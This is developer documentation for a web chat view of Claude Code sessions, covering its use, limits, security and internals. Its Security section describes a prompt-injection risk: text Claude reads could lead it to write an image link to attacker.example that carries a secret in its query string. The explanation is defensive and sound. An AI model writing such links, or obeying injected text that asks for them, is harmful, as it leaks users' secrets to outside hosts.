# Chat view

A Claude Code session can be shown as a **chat**, a web page with
formatted text, tables, code blocks, images and videos, in place
of its terminal. The session itself does not change: Claude keeps
running in its terminal on the host exactly as before. The chat
reads what Claude does and types what you write into the terminal
for you.

## Using it

Open a Claude session (a tab, or a detached window). It opens in
**Chat**. The switch at the top right, **Chat | Terminal**, flips
between the two views at any time. Each session remembers the
view you picked, in this browser.

- **Messages** show as chat bubbles: yours on the right, Claude's
  on the left, each with the time it was written. Long replies
  wrap inside the bubble; wide code blocks and tables scroll
  sideways within it. The chat opens at the latest message and
  follows new ones, unless you scroll up to read.
- **Writing:** type in the box at the bottom. Enter sends and
  Shift+Enter starts a new line. Slash commands (`/clear`,
  `/model`, ...) work as in the terminal. What you type is kept
  as a draft in this browser until you send it: switching to the
  terminal, to another tab or reloading the page does not lose
  it. The terminal's touch input bar shares the same draft.
- **Files and images:** the 📎 button, pasting an image, or
  dragging files onto the chat sends them to the session's host.
  Their paths are added to your message, the same as dropping a
  file on the terminal (see
  [Sending files to a session](host-daemon.md#sending-files-to-a-session)).
  Claude reads them from there.
- **Stop:** while Claude works, the ■ button presses Esc in the
  terminal, which interrupts it.
- **Tool calls** (commands, file edits, searches) in a row fold
  into one line that counts them, e.g. "1 command running, 3
  done", with the call running now next to it. Click it to list
  the calls, ✓ when done and red on error; click a call to see
  its input and result. Long results are cut in the chat; the
  terminal has them whole.

### Images and videos

The chat shows:

- **images in the conversation:** the ones you attach and the ones
  Claude reads (screenshots, diagrams);
- **image and video files on the host** that Claude names in
  markdown, as `![](out/chart.png)` or `[demo](clip.mp4)`, or as a
  path in code, as `` `out/chart.png` ``. Relative paths start at
  the session's folder;
- **images and videos from web addresses** (`https://...`).

To see a file Claude made, ask it to "show it here with
`![](path)`". It writes the path and the chat shows the file.
Images: PNG, JPEG, GIF, WebP, AVIF, BMP and SVG. Videos: MP4,
WebM and MOV, played in the page.

### Permission prompts and questions

When Claude waits for an answer (permission to run a tool,
a multiple choice question, the review of your answers, whether
to trust a folder), the chat shows the same menu above the
message box: what is asked, and one button per option, the
highlighted one marked.

- **Click an option** to pick it. The chat moves the terminal's
  highlight to it with the arrow keys and presses Enter, the
  same as doing it by hand, so every option works, "Yes, and
  don't ask again" included.
- **"Type something."** moves the highlight to the text option
  without Enter; write your answer in the message box and send
  it.
- **Cancel (Esc)** presses Esc, which answers no or closes the
  menu.
- **See in the terminal** shows the menu where it is drawn.

The chat finds the menu by reading the terminal's screen, so it
shows exactly the options Claude offers. If it cannot read one,
it says Claude is waiting and offers **See in the terminal**.
Sending a message hides that notice; it comes back only when
Claude asks again.

### PDFs, pages and artifacts

- **PDFs** Claude names (as `` `out/report.pdf` `` or a link) show
  as a preview in the message, with **Download** and a button to
  see them over the whole window.
- **HTML pages** on the session's host (`` `site/index.html` ``)
  show as an **Open page** button. The page opens over the whole
  window, with **Download** and a close button (✕) at the top
  right; Esc closes it too. Its scripts run, but sandboxed: the
  page cannot read your dashboard login or act as you.
- **Claude artifacts** (`https://claude.ai/.../artifact/...`):
  claude.ai does not let other sites show its pages, so the chat
  cannot frame the link itself. When Claude published the
  artifact from an HTML file in this conversation, an
  **Open artifact** button opens that file the same way. The link
  still opens claude.ai in a new tab.
- **Pasted text** in your messages shows set apart in the bubble,
  without the `<pasted_content>` tags Claude Code stores it with.

PDFs and HTML pages are served from the same folders as images
(see above). Showing them needs the host's daemon to be up to
date: restart it after updating.

## Limits

- **Claude Code only.** Codex, Grok and Bash sessions show only
  their terminal.
- **About a second behind.** Claude writes each message to its log
  once it is complete, so text appears message by message, not as
  it is typed. "Claude is working…" (and the Stop button) shows
  only after you send a message or answer a menu from the chat,
  then follows the session's status, which takes about 15 seconds
  to return to idle.
- **After `/clear`** the chat switches to the new conversation once
  you send its first message.
- **A resumed session** shows the conversation it continues.
- **Telemetry must be on.** The chat finds the conversation through
  Claude's telemetry (`CLAUDE_CODE_ENABLE_TELEMETRY`, set by the
  profile). If an organization policy turns it off, the chat stays
  empty; the terminal works as usual.
- Files are shown only when they are images or videos, up to 90 MB,
  inside the session's folder, its project, its uploads folder or
  the host's temporary folders.

## Security

- **Media from web addresses loads as soon as it is shown.** Text
  Claude reads (a web page, a file, an issue) can trick it into
  writing an image address that carries data out in its query
  string, e.g. `![](https://attacker.example/?d=<secret>)`. The
  browser fetches it when the chat shows it. To load web media only
  on a click, set `EXTERNAL_MEDIA_AUTOLOAD` to `false` in
  `frontend/src/components/chat/Markdown.tsx`.
- Claude's text is rendered as markdown without raw HTML. Links
  open in a new tab, and links to files on the host are not links.
- Host files are served only by the session's daemon, only as
  images or videos, and only from the session's folders (symbolic
  links are followed before checking). They come back with
  `X-Content-Type-Options: nosniff` and a sandboxing
  `Content-Security-Policy`, so an SVG opened on its own runs no
  script.
- As with the terminal, every signed-in dashboard user can open any
  session's chat.

## For developers

### How it works

1. Claude Code writes every conversation to
   `<CLAUDE_CONFIG_DIR or ~/.claude>/projects/<folder>/<session id>.jsonl`,
   one JSON object per line.
2. Claude's telemetry tags its logs and metrics with `session.id`.
   The daemon already receives them (OTLP) and knows which session
   they belong to (`service.name=<agent_id>`). `_note_chat_session`
   keeps the ID. The profile sends logs every second
   (`OTEL_LOGS_EXPORT_INTERVAL=1000`) so the ID arrives quickly.
3. `watch_chats` (every 0.5 s) finds the file
   (`transcripts.find_transcript`), reads what was added
   (`TranscriptReader`) and sends it to the viewers as
   `chat_messages`. A new session ID (first prompt, `/clear`)
   switches files and replaces the conversation. A resumed session
   starts on the folder's newest conversation, the one
   `claude --continue` picks.
4. The page types into the terminal with the existing
   `terminal_input` event: a bracketed paste, then Enter.

The daemon never starts sessions with Claude Code's own session
variables (`CLAUDECODE`, `CLAUDE_CODE_CHILD_SESSION`, ...). A
daemon started from inside Claude Code would otherwise make every
session a child session, which does not save its conversation.

### Messages

`agent/transcripts.py` turns each log line into a small message:

```json
{"id": "<uuid>", "ts": "2026-10-25T12:00:00Z",
 "role": "user | assistant | system",
 "blocks": [
   {"type": "text", "text": "..."},
   {"type": "image", "src": "t:<line offset>:<block>", "mime": "image/png"},
   {"type": "tool_use", "id": "...", "name": "Bash", "input": {}},
   {"type": "tool_result", "tool_use_id": "...", "text": "...",
    "is_error": false, "truncated": false, "images": []},
   {"type": "command", "name": "/clear", "args": ""},
   {"type": "notice", "kind": "compacted | command_output | task_notification | interrupted", "text": ""}
 ]}
```

- Only `user` and `assistant` lines are read. `isMeta` and
  `isSidechain` lines are skipped, and so are thinking blocks and
  every other kind of line.
- Tool results are cut to 4,000 characters, and each string of a
  tool's input to 2,000.
- Images are not copied into messages: `src` points at the line,
  and the bytes are read again when the page asks
  (`transcripts.image_at`).

### Events and endpoint

| Where | Event or path | What it does |
| --- | --- | --- |
| page → hub | `chat_join {agent_id}` | Joins room `chat:<agent_id>` and asks the session's daemon for the conversation |
| page → hub | `chat_leave {agent_id}` | Leaves the room |
| hub → daemon | `chat_history {agent_id, requester}` | The daemon answers with the whole conversation (`replace: true`) for that page only |
| daemon → hub → page | `chat_messages {agent_id, messages, replace}` | New messages, or the whole conversation; accepted only from a daemon |
| page → hub | `GET /agents/{agent_id}/media?src=...` | An image or video: a transcript image (`t:...`) or a host path. Supports `Range` (206) for video |
| hub → daemon | `read_media {agent_id, src, offset, length}` (call) | Answers `{ok, mime, size, data}` with up to 8 MB |

The hub accepts Socket.IO messages up to 16 MB
(`MAX_MESSAGE_BYTES` in `backend/app/socket.py`) for media pieces
and large conversations.

### Files

- `agent/transcripts.py`: the transcript reader, path checks.
- `agent/host_daemon.py`: `watch_chats`, `read_media`,
  `_note_chat_session`, and the `chat_history` and `read_media`
  handlers.
- `agent/profiles/claude.yaml`: `chat: claude` turns the view on
  (see [Agent profiles](agent-profiles.md)).
- `backend/app/socket.py` (`chat_*` events) and
  `backend/app/main.py` (`/agents/{id}/media`).
- `frontend/src/components/chat/`: `ChatView`, `ChatMessage`,
  `Markdown`, `ChatComposer` and the helpers in `chat.ts`. The
  switch is in `Terminal.tsx`. The chat lies over the terminal,
  which stays mounted, so the agent's screen size never changes.
- Tests: `agent/tests/test_transcripts.py`,
  `backend/tests/test_chat.py` and
  `frontend/src/components/chat/__tests__/`.

### Adding another agent

Write a reader that turns the tool's own log into the same
messages, give the profile `chat: <name>`, and choose the reader
by that name in `spawn_agent`. The page needs no change. Codex
keeps its log in `$CODEX_HOME/sessions/YYYY/MM/DD/rollout-*.jsonl`,
and Grok in `~/.grok/sessions/<folder>/<id>/chat_history.jsonl`.
